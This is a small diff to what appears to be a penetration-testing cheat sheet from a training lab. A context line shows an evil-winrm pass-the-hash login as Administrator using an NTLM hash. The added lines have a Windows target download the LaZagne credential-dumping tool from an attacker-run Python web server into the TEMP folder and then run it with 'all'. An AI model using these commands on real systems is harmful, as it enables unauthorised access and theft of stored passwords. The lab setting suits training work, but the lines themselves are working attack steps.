@@ -89,7 +89,10 @@ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 
 #LaZagne
 attacker: python3 -m http.server 8000
-Win Target: Invoke-WebRequest -Uri http://10.10.14.118:8000/LaZagne.exe -OutFile C:\Users\Bob\Desktop\LaZagne.exe
+Win Target: Invoke-WebRequest -Uri http://10.10.14.118:8000/LaZagne.exe -OutFile $env:TEMP\LaZagne.exe
+Win Target: $path="$env:TEMP\LaZagne.exe"
+Win Target: & $path all
+
 
 ```
 
